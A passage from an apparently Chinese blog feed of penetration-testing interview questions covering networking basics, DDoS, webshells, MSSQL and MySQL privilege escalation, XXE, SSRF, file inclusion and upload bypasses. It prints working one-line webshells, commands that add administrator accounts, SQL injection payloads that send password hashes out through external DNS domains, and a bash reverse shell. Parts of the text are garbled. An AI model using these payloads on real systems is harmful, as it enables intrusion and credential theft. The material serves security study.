<p>分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动 DDoS攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将DDoS 主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收到指令时就发动攻击。利用客户/服务器技术，主控程序能在几秒钟内激活成百上千次代理程序的运行。</p>
<p><strong>20.震网病毒的定义？</strong></p>
<p>指一种蠕虫病毒，是第一个专门定向攻击真实世界中基础（能源）设施的“蠕虫”病毒，比如核电站，水坝，国家电网。只要电脑操作员将被病毒感染的 U 盘插入 USB 接口，这种病毒就会在神不知鬼不觉的情况下(不会有任何其他操作要求或者提示出现)取得一些工业用电脑系统的控制权。与传统的电脑病毒相比，“震网”病毒不会通过窃取个人隐私信息牟利。无需借助网络连接进行传播。这种病毒可以破坏世界各国的化工、发电和电力传输企业所使用的核心生产控制电脑软件，并且代替其对工厂其他电脑“发号施令”。极具毒性和破坏力。“震网”代码非常精密，主要有两个功能，一是使伊朗的离心机运行失控，二是掩盖发生故障的情况，“谎报军情”，以“正常运转”记录回传给管理部门，造成决策的误判。</p>
<p><strong>21.常用的一句话木马？</strong></p>
<p>asp 一句话木马： <code>&lt;%execute(request(&quot;value&quot;))%&gt;</code></p>
<p>php 一句话木马：<code>&lt;?php @eval($_POST[value]);?&gt;</code></p>
<p>变形：<code>&lt;?php $x=$_GET[‘z’];@eval(“$x;”);?&gt;</code></p>
<p>aspx 一句话木马：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;%eval(Request.Item[&quot;value&quot;])%&gt;</span><br></pre></td></tr></table></figure>

<p><strong>22.Https 的作用？</strong></p>
<p>内容加密 建立一个信息安全通道，来保证数据传输的安全；身份认证 确认网站的真实性数据完整性 防止内容被第三方冒充或者篡改</p>
<p>HTTPS 和 HTTP 的区别</p>
<p>https 协议需要到 CA 申请证书。http 是超文本传输协议，信息是明文传输；https 则是具有安全性的 ssl 加密传输协议。http 和 https 使用的是完全不同的连接方式，用的端口也不一样，前者是 80，后者是 443。</p>
<p>http 的连接很简单，是无状态的；HTTPS 协议是由 SSL+HTTP 协议构建的可进行加密传输、身份认证的网络协议，比 http 协议安全。</p>
<p><strong>23.手工查找后门木马的小技巧？</strong></p>
<p>1、首先最需要注意的地方是系统的启动项，可以在“运行”-输入“msconfig命令”在打开的系统配置实用程序里的启动列表查看，并且服务也要注意一下，如果对电脑不是太熟悉的童鞋建议使用 360 安全卫士的开机加速功能，来查看有无异常的可以启动项和服务项，因为在后门木马中 99%都会注册自己为系统服务，达到开机自启动的目的，如果发现可疑项直接打开相应的路径，找到程序文件，直接删除并且禁止自启动；</p>
<p>2、查看系统关键目录 system32 和系统安装目录 Windows 下的文件，xp 系统下两者默认路径分别是C:\WINDOWS\system32 和 C:\WINDOWS\。然后最新修改的文件中有没有可疑的可执行文件或 dll 文件，这两个地方都是木马最喜欢的藏身的地方了（小提示：一定要设置显示所有的文件的文件夹哦）。</p>
<p>3、观察网络连接是否存在异常，还有  “运行”-“cmd”-“netstat -an”查看有没有可疑或非正常程序的网络连接，如果对电脑不是很熟悉建议大家使用 360的流量监控功能更加直观和方便，尤其注意一下远程连接的端口，如果有类似于8000 等端口就要注意了，8000 是灰鸽子的默认端口，记得有一次自己就在后门木马测试中在网络连接中发现 8000 端口，当然意思不是说只要没有 8000 端口的网络连接就一定安全，因为 8000 端口只是灰鸽子上线的默认端口，并且端口是可以更改的。通过以上方法，可以查找到电脑的一些可疑文件，如果确认无疑，就可以手工进行删除了。当然还可以借助杀毒软件的力量。如果你真的中了木马后门，不用慌。最好最彻底的方法是重装系统后，在安全模式下，利用最新病毒库的杀软进行查杀。</p>
<p><strong>24.描述 OSI（开放系统互联基本参考模型）七层结构？</strong></p>
<p>分层的好处是利用层次结构可以把开放系统的信息交换问题分解到一系列容易控制的软硬件模块－层中，而各层可以根据需要独立进行修改或扩充功能，同时，有利于个不同制造厂家的设备互连，也有利于大家学习、理解数据通讯网络。</p>
<p>OSI 参考模型中不同层完成不同的功能，各层相互配合通过标准的接口进行通信。</p>
<p>第 7 层应用层：OSI 中的最高层。为特定类型的网络应用提供了访问 OSI 环境的手段。应用层确定进程之间通信的性质，以满足用户的需要。应用层不仅要提供应用进程所需要的信息交换和远程操作，而且还要作为应用进程的用户代理，来完成一些为进行信息交换所必需的功能。它包括：文件传送访问和管理 FTAM、虚拟终端 VT、事务处理 TP、远程数据库访问 RDA、制造报文规范 MMS、目录服务 DS 等协议；应用层能与应用程序界面沟通，以达到展示给用户的目的。 在此常见的协议有:HTTP，HTTPS，FTP，TELNET，SSH，SMTP，POP3 等。</p>
<p>第 6 层表示层：主要用于处理两个通信系统中交换信息的表示方式。为上层用户解决用户信息的语法问题。它包括数据格式交换、数据加密与解密、数据压缩与终端类型的转换。</p>
<p>第 5 层会话层：在两个节点之间建立端连接。为端系统的应用程序之间提供了对话控制机制。此服务包括建立连接是以全双工还是以半双工的方式进行设置，尽管可以在层 4 中处理双工方式 ；会话层管理登入和注销过程。它具体管理两个用户和进程之间的对话。如果在某一时刻只允许一个用户执行一项特定的操作，会话层协议就会管理这些操作，如阻止两个用户同时更新数据库中的同一组数据。</p>
<p>第 4 层传输层：—常规数据递送－面向连接或无连接。为会话层用户提供一个端到端的可靠、透明和优化的数据传输服务机制。包括全双工或半双工、流控制和错误恢复服务；传输层把消息分成若干个分组，并在接收端对它们进行重组。不同的分组可以通过不同的连接传送到主机。这样既能获得较高的带宽，又不影响会话层。在建立连接时传输层可以请求服务质量，该服务质量指定可接受的误码率、延迟量、安全性等参数，还可以实现基于端到端的流量控制功能。</p>
<p>第 3 层网络层：本层通过寻址来建立两个节点之间的连接，为源端的运输层送来的分组，选择合适的路由和交换节点，正确无误地按照地址传送给目的端的运输层。它包括通过互连网络来路由和中继数据 ；除了选择路由之外，网络层还负责建立和维护连接，控制网络上的拥塞以及在必要的时候生成计费信息。</p>
<p>第 2 层数据链路层：在此层将数据分帧，并处理流控制。屏蔽物理层，为网络层提供一个数据链路的连接，在一条有可能出差错的物理连接上，进行几乎无差错的数据传输（差错控制）。本层指定拓扑结构并提供硬件寻址。常用设备有网卡、网桥、交换机；</p>
<p>第 1 层物理层：处于 OSI 参考模型的最底层。物理层的主要功能是利用物理传输介质为数据链路层提供物理连接，以便透明的传送比特流。常用设备有（各种物理设备）集线器、中继器、调制解调器、网线、双绞线、同轴电缆。数据发送时，从第七层传到第一层，接收数据则相反。上三层总称应用层，用来控制软件方面。下四层总称数据流层，用来管理硬件。除了物理层之外其他层都是用软件实现的。数据在发至数据流层的时候将被拆分。在传输层的数据叫段，网络层叫包，数据链路层叫帧，物理层叫比特流，这样的叫法叫 PDU（协议数据单元）</p>
<p>[2]各层功能</p>
<p>(1)物理层(Physical Layer)</p>
<p>物理层是 OSI 参考模型的最低层，它利用传输介质为数据链路层提供物理连接。它主要关心的是通过物理链路从一个节点向另一个节点传送比特流，物理链路可能是铜线、卫星、微波或其他的通讯媒介。它关心的问题有：多少伏电压代表 1？多少伏电压代表 0？时钟速率是多少？采用全双工还是半双工传输？总的来说物理层关心的是链路的机械、电气、功能和规程特性。</p>
<p>(2)数据链路层(Data Link Layer)</p>
<p>数据链路层是为网络层提供服务的，解决两个相邻结点之间的通信问题，传送的协议数据单元称为数据帧。数据帧中包含物理地址（又称 MAC 地址）、控制码、数据及校验码等信息。该层的主要作用是通过校验、确认和反馈重发等手段，将不可靠的物理链路转换成对网络层来说无差错的数据链路。此外，数据链路层还要协调收发双方的数据传输速率，即进行流量控制，以防止接收方因来不及处理发送方来的高速数据而导致缓冲器溢出及线路阻塞。</p>
<p>(3)网络层(Network Layer)</p>
<p>网络层是为传输层提供服务的，传送的协议数据单元称为数据包或分组。该层的主要作用是解决如何使数据包通过各结点传送的问题，即通过路径选择算法（路由）将数据包送到目的地。另外，为避免通信子网中出现过多的数据包而造成网络阻塞，需要对流入的数据包数量进行控制（拥塞控制）。当数据包要跨越多个通信子网才能到达目的地时，还要解决网际互连的问题。</p>
<p>(4)传输层(Transport Layer)</p>
<p>传输层的作用是为上层协议提供端到端的可靠和透明的数据传输服务，包括处理差错控制和流量控制等问题。该层向高层屏蔽了下层数据通信的细节，使高层用户看到的只是在两个传输实体间的一条主机到主机的、可由用户控制和设定的、可靠的数据通路。传输层传送的协议数据单元称为段或报文。</p>
<p>(5)会话层(Session Layer)</p>
<p>会话层主要功能是管理和协调不同主机上各种进程之间的通信（对话），即负责建立、管理和终止应用程序之间的会话。会话层得名的原因是它很类似于两个实体间的会话概念。例如，一个交互的用户会话以登录到计算机开始，以注销结束。</p>
<p>(6)表示层(Presentation Layer)</p>
<p>表示层处理流经结点的数据编码的表示方式问题，以保证一个系统应用层发出的信息可被另一系统的应用层读出。如果必要，该层可提供一种标准表示形式，用于将计算机内部的多种数据表示格式转换成网络通信中采用的标准表示形式。数据压缩和加密也是表示层可提供的转换功能之一。</p>
<p>(7)应用层(Application Layer)</p>
<p>应用层是 OSI 参考模型的最高层，是用户与网络的接口。该层通过应用程序来完成网络用户的应用需求，如文件传输、收发电子邮件等。</p>
<p><strong>25.TCP 和 UDP 的区别？</strong></p>
<p>TCP 协议和 UDP 协议特性区别总结：</p>
<ol>
<li><p>TCP 协议在传送数据段的时候要给段标号；UDP 协议不</p>
</li>
<li><p>TCP 协议可靠；UDP 协议不可靠3. TCP 协议是面向连接；UDP 协议采用无连接</p>
</li>
<li><p>TCP 协议负载较高，采用虚电路；UDP 采用无连接</p>
</li>
<li><p>TCP 协议的发送方要确认接收方是否收到数据段（3 次握手协议）</p>
</li>
<li><p>TCP 协议采用窗口技术和流控制</p>
</li>
</ol>
<p>当数据传输的性能必须让位于数据传输的完整性、可控制性和可靠性时，TCP协议是当然的选择。当强调传输性能而不是传输的完整性时，如：音频和多媒体应用，UDP 是最好的选择。在数据传输时间很短，以至于此前的连接过程成为整个流量主体的情况下，UDP 也是一个好的选择，如：DNS 交换。把 SNMP建立在 UDP 上的部分原因是设计者认为当发生网络阻塞时，UDP 较低的开销使其有更好的机会去传送管理数据。TCP 丰富的功能有时会导致不可预料的性能低下，但是我们相信在不远的将来，TCP 可靠的点对点连接将会用于绝大多数的网络应用。</p>
<p><strong>26.什么叫脱壳?</strong></p>
<p>而从技术的角度出发，壳是一段执行于原始程序前的代码。原始程序的代码在加壳的过程中可能被压缩、加密……。当加壳后的文件执行时，壳－这段代码先于原始程序运行，他把压缩、加密后的代码还原成原始程序代码，然后再把执行权交还给原始代码。 软件的壳分为加密壳、压缩壳、伪装壳、多层壳等类，目的都是为了隐藏程序真正的 OEP（入口点，防止被破解）。加壳”指的是对编译好的 EXE、DLL 等文件采用加壳来进行保护；“脱壳”指的就是将文件外边的壳去除，恢复文件没有加壳前的状态。 壳出于程序作者想对程序资源压缩、注册保护的目的，把壳分为压缩壳、密码壳、加密壳三种。</p>
<p>顾名思义，压缩壳只是为了减小程序体积对资源进行压缩，常见的压缩壳包括 FSG、ASPack、UPX、北斗等；加密壳也就是常说的保护壳、猛壳，它对程序输入表等内容进行加密保护，具有良好的保护效果，常见的加密壳包括 ASPROTECT、ACPROTECT、PELock、幻影等；密码壳平时使用得不多，加密壳的程序只有在正确输入密码后才能运行</p>
<p><strong>27.什么叫“人肉搜索”?</strong></p>
<p>是一种类比的称呼，主要是用来区别传统搜索引擎。它主要是指通过集中许多网民的力量去搜索信息和资源的一种方式，它包括利用互联网的机器搜索引擎（如百度等）及利用各网民在日常生活中所能掌握的信息来进行收集信息的一种方式 。 </p>
<p><strong>28.SYN Flood 的基本原理？</strong></p>
<p>SYN Flood 是当前最流行的 DoS（拒绝服务攻击）与 DDoS（分布式拒绝服务攻击）的方式之一，这是一种利用 TCP 协议缺陷，发送大量伪造的 TCP 连接请求，从而使得被攻击方资源耗尽（CPU 满负荷或内存不足）的攻击方式。要明白这种攻击的基本原理，还是要从 TCP 连接建立的过程开始说起：大家都知道，TCP 与 UDP 不同，它是基于连接的，也就是说：为了在服务端和客户端之间传送 TCP 数据，必须先建立一个虚拟电路，也就是 TCP 连接，建立 TCP 连接的标准过程是这样的：</p>
<p>首先，请求端（客户端）发送一个包含 SYN 标志的 TCP 报文，SYN 即同步（Synchronize），同步报文会指明客户端使用的端口以及 TCP 连接的初始序号；</p>
<p>第二步，服务器在收到客户端的 SYN 报文后，将返回一个 SYN+ACK 的报文，表示客户端的请求被接受，同时 TCP 序号被加一，ACK 即确认（Acknowledgement）。</p>
<p>第三步，客户端也返回一个确认报文 ACK 给服务器端，同样 TCP 序列号被加一，到此一个 TCP 连接完成。以上的连接过程在 TCP 协议中被称为三次握手（Three-way Handshake）。问题就出在 TCP 连接的三次握手中，假设一个用户向服务器发送了 SYN 报文后突然死机或掉线，那么服务器在发出 SYN+ACK 应答报文后是无法收到客户端的 ACK 报文的（第三次握手无法完成），这种情况下服务器端一般会重试（再次发送 SYN+ACK 给客户端）并等待一段时间后丢弃这个未完成的连接，这段时间的长度我们称为 SYN Timeout，一般来说这个时间是分钟的数量级（大约为 30 秒-2 分钟）；一个用户出现异常导致服务器的一个线程等待 1 分钟并不是什么很大的问题，但如果有一个恶意的攻击者大量模拟这种情况，服务器端将为了维护一个非常大的半连接列表而消耗非常多的资源—-数以万计的半连接，即使是简单的保存并遍历也会消耗非常多的 CPU 时间和内存，何况还要不断对这个列表中的 IP 进行 SYN+ACK 的重试。实际上如果服务器的 TCP/IP 栈不够强大，最后的结果往往是堆栈溢出崩溃—即使服务器端的系统足够强大，服务器端也将忙于处理攻击者伪造的 TCP 连接请求而无暇理睬客户的正常请求（毕竟客户端的正常请求比率非常之小），此时从正常客户的角度看来，服务器失去响应，这种情况我们称作：服务器端受到了 SYN Flood 攻击（SYN 洪水攻击）。</p>
<p>从防御角度来说，有几种简单的解决方法，</p>
<p>第一种是缩短 SYN Timeout 时间，由于 SYN Flood 攻击的效果取决于服务器上保持的 SYN 半连接数，这个值=SYN 攻击的频度 x SYN Timeout，所以通过缩短从接收到 SYN 报文到确定这个报文无效并丢弃改连接的时间，例如设置为 20 秒以下（过低的 SYN Timeout设置可能会影响客户的正常访问），可以成倍的降低服务器的负荷。</p>
<p>第二种方法是设置 SYN Cookie，就是给每一个请求连接的 IP 地址分配一个Cookie，如果短时间内连续受到某个 IP 的重复 SYN 报文，就认定是受到了攻击，以后从这个 IP 地址来的包会被一概丢弃。可是上述的两种方法只能对付比较原始的 SYN Flood 攻击，缩短 SYN Timeout时间仅在对方攻击频度不高的情况下生效，SYN Cookie 更依赖于对方使用真实的 IP 地址，如果攻击者以数万/秒的速度发送 SYN 报文，同时利用 SOCK_RAW随机改写 IP 报文中的源地址，以上的方法将毫无用武之地。</p>
<p><strong>29什么是手机”越狱“？</strong></p>
<p>所谓 iOS 系统的越狱就是取得系统最高权限的行为，越狱前后 iOS 系统本身并不会发生质的改变，只是越狱后可以对 iOS 系统进行更充分的利用而已。</p>
<p>越狱的好处：</p>
<p>1、越狱之后操作性更强，取得了手机的最高权限，就可以修改手机内容，包括安装免费的破解软件、自定义功能、美化等等。</p>
<p>2、越狱后可以绕过 AppStore 免费下载 APP。</p>
<p>越狱的坏处：</p>
<p>1、越狱后失去保修。</p>
<p>2、越狱之后，后台程序运行，桌面主题等都会加大耗电。</p>
<p>3、越狱就是打破 iOS 系统封闭，所以手机就相对变得不安全了。</p>
<p><strong>30. NAT（网络地址转换）协议?</strong></p>
<p>内网的计算机以 NAT（网络地址转换）协议，通过一个公共的网关访问 Internet。</p>
<p>内网的计算机可向 Internet 上的其他计算机发送连接请求，但 Internet 上其他的计算机无法向内网的计算机发送连接请求。</p>
<p>NAT（Network Address Translator）是网络地址转换，它实现内网的 IP 地址与公网的地址之间的相互转换，将大量的内网 IP 地址转换为一个或少量的公网IP 地址，减少对公网 IP 地址的占用。NAT 的最典型应用是：在一个局域网内，只需要一台计算机连接上 Internet，就可以利用 NAT 共享 Internet 连接，使局域网内其他计算机也可以上网。使用 NAT 协议，局域网内的计算机可以访问Internet 上的计算机，但 Internet 上的计算机无法访问局域网内的计算机。</p>
<p>A 类 10.0.0.0–10.255.255.255</p>
<p>B 类 172.16.0.0–172.31.255.255</p>
<p>C 类 192.168.0.0–192.168.255.255</p>
<p>内网保留地址编辑Internet 设计者保留了 IPv4 地址空间的一部份供专用地址使用,专用地址空间中的 IPv4 地址叫专用地址,这些地址永远不会被当做公用地址来分配,所以专用地址永远不会与公用地址重复.</p>
<p>IPv4 专用地址如下：</p>
<p>IP 等级 IP 位置</p>
<p>Class A 10.0.0.0-10.255.255.255 默认子网掩码:255.0.0.0  </p>
<p>Class B 172.16.0.0-172.31.255.255 默认子网掩码:255.240.0.0 </p>
<p>Class C 192.168.0.0-192.168.255.255 默认子网掩码:255.255.0.0</p>
<p>内网是可以上网的.内网需要一台服务器或路由器做网关,通过它来上网做网关的服务器有一个网关（服务器/路由器）的 IP 地址,其它内网电脑的 IP 可根据它来随意设置,前提是 IP 前三个数要跟它一样,第四个可从 0-255 中任选但要跟服务器的 IP 不同</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试面试总结(三)</title>
    <url>/2019/12/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E8%AF%95%E9%A2%98(%E4%B8%89)/</url>
    <content><![CDATA[<p>关于面试的一些总结。</p>
<a id="more"></a>

<p><strong>1.mssql 提权的提权思路有哪些步骤？</strong></p>
<p>（1）首先看看 xp_cmdshel 是否 l 存在,不存在的话先恢复，恢复语句如下：</p>
<p>Exec sp_configure show advanced options,1;RECONFIGURE;EXEC </p>
<p>sp_configure xp_cmdshell,1;RECONFIGURE;</p>
<p>EXEC sp_configure show advanced options, 1;RECONFIGURE;</p>
<p>EXEC sp_configure xp_cmdshell, 1;RECONFIGURE;–</p>
<p>（2）如果 xp_cmdshell 还是不行就再执行命令;dbcc addextendedproc(“xp_cmdshell”,”xplog70.dll”);–或;sp_addextendedproc xp_cmdshell,@dllname=xplog70.dll 来恢复cmdshell</p>
<p>（3）无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指</p>
<p>定的程序。)</p>
<p>恢复方法：查询分离器连接后,</p>
<p>第一步执行:exec sp_dropextendedproc xp_cmdshell</p>
<p>第二步执行:exec sp_addextendedproc xp_cmdshell,xpweb70.dll</p>
<p>然后按 F5 键命令执行完毕</p>
<p>（4）终极方法如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户:</p>
<p>查询分离器连接后,</p>
<p>2000servser 系统:</p>
<p>declare @shell int exec sp_oacreate wscript.shell,@shell output exec sp_oamethod @shell,run,null,c:winntsystem32cmd.exe /c net user dell huxifeng007 /add</p>
<p>declare @shell int exec sp_oacreate wscript.shell,@shell output exec sp_oamethod @shell,run,null,c:winntsystem32cmd.exe /c net localgroup administrators dell /add</p>
<p>sql2008 提权 低权限运行</p>
<p><strong>2、mssql 提权提示错误代码 5，cmd 权限不足的原因？</strong></p>
<p>错误代码”5″，马上 google 之。由于 xp_cmdshell 是严格用%systemroot%\system32\cmd.exe 去执行所提交的命令的，提示”5″，意思是 cmd 的权限不足，就是说 system32 下的 cmd.exe 被降权了。当然也有绕过的方法，比如启用沙盒模式执行 shell 命令：</p>
<p><strong>3.怎么用 sqlmap 对 sa 权限的 mssql 2008 进行提权？</strong></p>
<p>（1）第一种函数</p>
<p>select name from sysobjects where xtype=u 通过这个来爆第一个表</p>
<p>select name from sysobjects where xtype=u and name not in(爆出来的表1，爆出来的表 2…)一直爆下去，直到找到我们所需要的表位置</p>
<p>（2）第二种函数select table_name from information_schema.tables select table_name from information_schema.tables where table_name not in (爆出来的表 1，爆出来的表 2…)</p>
<p>参考文章：<a href="http://www.freebuf.com/articles/web/10280.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/10280.html</a></p>
<p><strong>4.xxe 注入有哪些危害以及防御 ？</strong></p>
<p>(1)引用外部实体<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;或者 &lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code>当允许引用外部实体时，通过构造恶意内容</p>
<p>(2)可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。对于不同 XML 解析器,对外部实体有不同处理规则,在 PHP 中默认处理的函数为: xml_parse 和 simplexml_load xml_parse 的实现方式为 expat 库，默认情况不会解析外部实体,而 simplexml_load 默认情况下会解析外部实体,造成安全威胁. 除 PHP 外，在 Java，Python 等处理 xml 的组件及函数中都可能存在此问题.</p>
<p>（3）防御：</p>
<p>方案一、使用开发语言提供的禁用外部实体的方法</p>
<p>libxml_disable_entity_loader(true);</p>
<p>方案二、过滤用户提交的 XML 数据</p>
<p>1.检查所使用的底层 xml 解析库，默认禁止外部实体的解析</p>
<p>2.使用第三方应用代码及时升级补丁</p>
<p>3.同时增强对系统的监控，防止此问题被人利用</p>
<p>对于 PHP,由于 simplexml_load_string 函数的 XML 解析问题出在 libxml 库上,所以加载实体前可以调用这样一个函数</p>
<p><strong>5.gpc 魔术引号？</strong></p>
<p>在 PHP 中是默认打开“魔术引号（Magic Quote）GPC”的。开启magic_quote_gpc=on之后,相当于使用addslshes()这个函数。</p>
<p>魔术引号（Magic Quote）是一个自动将进入 PHP 脚本的数据进行转义的过程。最好在编码时不要转义而在运行时根据需要而转义。<br>一、什么是魔术引号<br>当打开时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。这和 addslashes() 作用完全相同。</p>
<p><strong>6.MYSQL 有哪些提权方法？</strong></p>
<p>（1）UDF 提权</p>
<p>这类提权方法我想大家已经知道了，我大致写一下，具体语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create function cmdshell returns string soname ’udf.dll’</span><br><span class="line"></span><br><span class="line">select cmdshell(’net user iis_user 123!@#abcABC /add’);</span><br><span class="line"></span><br><span class="line">select cmdshell(’net localgroup administrators iis_user /add’);</span><br><span class="line"></span><br><span class="line">select cmdshell(’regedit /s d:web3389.reg’);</span><br><span class="line"></span><br><span class="line">drop function cmdshell;</span><br><span class="line"></span><br><span class="line">select cmdshell(’netstat -an’);</span><br></pre></td></tr></table></figure>

<p>（2）VBS 启动项提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table a (cmd text);</span><br><span class="line">insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot; );</span><br><span class="line">insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user iis_user </span><br><span class="line">123!@#abcABC/add&quot;&quot;,0)&quot;);</span><br><span class="line">insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators iis_user /add&quot;&quot;,0)&quot;);</span><br><span class="line">select * from a into outfile &quot;C:\Documents and Settings\All Users\「开始」菜单\程序\启动\a.vbs&quot;;</span><br></pre></td></tr></table></figure>

<p>（3）Linx MySQL BackDoor 提权</p>
<p>Linx Mysql Door</p>
<p>Mysql BackDoor 是一款针对 PHP+Mysql 服务器开发的后门,该后门安装后为Mysql增加一个可以执行系统命令的”state”函数,并且随Mysql进程启动一个基于 Dll 的嗅探型后门,这个后门在 Windows 下拥有与 Mysql 一样的系统权限,从而巧妙的实现了无端口,无进程,无服务的穿墙木马.</p>
<p>用法：将 Mysql.php 传到 PHP 服务器上,点击”自动安装 Mysql BackDoor”，然后直接执行命令即可</p>
<p>（4）MIX.DLL 提权</p>
<p>1.在独立 IP 的 sqlmap 下运</p>
<p>2.禁用本地缓存 net stop dns</p>
<p>3.<a href="http://localhost/inject.php?user=123&#39;" target="_blank" rel="noopener">http://localhost/inject.php?user=123&#39;</a> and if((SELECT LOAD_FILE(CONCAT(‘\‘,(SELECT hex(user())),’.abc.com\foobar’))),1,1)%23</p>
<p><a href="http://localhost/inject.php?user=123&#39;" target="_blank" rel="noopener">http://localhost/inject.php?user=123&#39;</a> and if((SELECT LOADFILE(CONCAT(‘\‘,(SELECT concat(user,’’,mid(password,2,41)) from user where user=’root’ limit 1),’.md5crack.cn\foobar’))),1,1)%23</p>
<p>4.DNS 突破</p>
<p>参考文章：<a href="http://www.freebuf.com/vuls/85021.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/85021.html</a></p>
<p><strong>7.什么叫 ssrf 以及 ssrf 的防御？</strong></p>
<p>(1)SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统</p>
<p>(2)SSRF 统一错误信息，避免用户可以根据错误信息来判断远程服务器端口状态</p>
<p>1.限制请求的端口为 HTTP 常用的端口，比如 80,443,8080,8088 等</p>
<p>2.黑名单内网 IP。</p>
<p>3.禁用不需要的协议，仅仅允许 HTTP 和 HTTPS.</p>
<p><strong>8.如何利用 php 的远程命令执行函数进行反弹 nc?</strong></p>
<p>system,exec,shell_exec,paassthru,popen,proc_popen,反弹 shell 公网服务器执行 nc –lvv 8888目标服务器上执行<code>?cmd= bash -i &gt;&amp; /dev/tcp/10.0.0.1/8888 0&gt;&amp;1</code>并在 disabl_functions 中禁用</p>
<p><strong>9.文件包含漏洞可以用来做啥，以及需要主要注意的事项？</strong></p>
<p>（1）配合文件上传漏洞 GetShell，可以执行任意脚本代码，网站源码文件以及配置文件泄露，远程包含 GetShel， 控制整个网站甚至是服务器</p>
<p>（2）allow_url_fopen 和 allow_url_include 为 ON 的话，则包含的文件可以是</p>
<p>第三方服务器中的文件，这样就形成了远程文件包含漏洞（3）/etc/passwd • 需要 magic_quotes_gpc=off,PHP 小于 5.3.4 有效</p>
<p>（4）/etc/passwd././././././././././././.[……]/././././././././.</p>
<p>（5）php 版本小于 5.2.8 可以成功，linux 需要文件名长于 4096，windows需要长于 256index.php?page=php://filter/read/=convert.base64-encode/resource=index.php</p>
<p><strong>10.文件上传有哪些技巧？</strong></p>
<p>通过抓包截断将 eval.php.jpg 换成 eval.php_jpg(下划线为 0x00)。在上传文件时系统文件遇到 0x00。会认为文件已经结束。从而将 eval.php.jpg 的内容写入到 eval.php 中 .htaccess 文件内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch “haha”&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure>

<p>文件函数检测 jpg(JFIF) gif(GIF89a) png(%PNG) </p>
<p>apache 解析漏洞，2.0-2.2 IIS7.5 解析漏洞，任意文件名后加.php nginx&lt;0.8.32 1.jpg/1.phpnginx&gt;0.8.41&lt;1.5.6,1.jpg%20.php 解析**SQL 注入（Sql Injection ）是一种将 SQL 语句插入或添加到应用(用户)的输入参数中的攻击，之后再将这些参数传递给后台的 SQL 服务器加以解析并执行。</p>
<p><strong>11.HTTP 协议 head 方法的功能与 get 方法不同之处是？</strong></p>
<p>不同之处在于服务器不会在其相应中返回消息主体。</p>
<p>• TRACE。这种方法主要用于诊断。</p>
<p>• OPTIONS。这种方法要求服务器报告对某一特殊资源有效的 HTTP 方法。</p>
<p>• PUT。这个方法试图使用包含在请求主体中的内容，向服务器上传制定的资源</p>
<p>** 各种注释#– – - –+ // /**/ 空白字符，+号，-号，～号，！号，@形式 {} %0a—————————–</p>
<p><strong>12.域和组的区别是什么？</strong></p>
<p>工作组是一群计算机的集合，它仅仅是一个逻辑的集合，各自计算机还是各自管理的，你要访问其中的计算机，还是要到被访问计算机上来实现用户验证的。而域不同，域是一个有安全边界的计算机集合，在同一个域中的计算机彼此之间已经建立了信任关系，在域内访问其他机器，不再需要被访问机器的许可了。为什么是这样的呢？因为在加入域的时候，管理员为每个计算机在域中（可和用户不在同一域中）建立了一个计算机帐户，这个帐户和用户帐户一样，也有密码保护的。可是大家要问了，我没有输入过什么密码啊，是的，你确实没有输入，计算机帐户的密码不叫密码，在域中称为登录凭据，它是由 2000 的 DC（域控制器）上的 KDC 服务来颁发和维护的。为了保证系统的安全，KDC 服务每 30 天会自动更新一次所有的凭据，并把上次使用的凭据记录下来。周而复始。也就是说服务器始终保存着 2 个凭据，其有效时间是 60 天，60 天后，上次使用的凭据就会被系统丢弃。如果你的 GHOST 备份里带有的凭据是 60 天的，那么该计算机将不能被 KDC 服务验证，从而系统将禁止在这个计算机上的任何访问请求（包括登录），解决的方法呢，简单的方法使将计算机脱离域并重新加入，KDC 服务会重新设置这一凭据。或者使用 2000 资源包里的 NETDOM 命令强制重新设置安全凭据。因此在有域的环境下，请尽量不要在计算机加入域后使用 GHOST备份系统分区，如果作了，请在恢复时确认备份是在 60 天内作的，如果超出，就最好联系你的系统管理员，你可以需要管理员重新设置计算机安全凭据，否则你将不能登录域环境。域和工作组适用的环境不同，域一般是用在比较大的网络里，工作组则较小，在一个域中需要一台类似服务器的计算机，叫域控服务器，其他电脑如果想互相访问首先都是经过它的，但是工作组则不同，在一个工作组里的所有计算机都是对等的，也就是没有服务器和客户机之分的，但是和域一样，如果一台计算机想访问其他计算机的话首先也要找到这个组中的一台类似组控服务器，组控服务器不是固定的，以选举的方式实现，它存储着这个组的相关信息，找到这台计算机后得到组的信息然后访问。</p>
<p><strong>13.对称加密非对称加密？</strong></p>
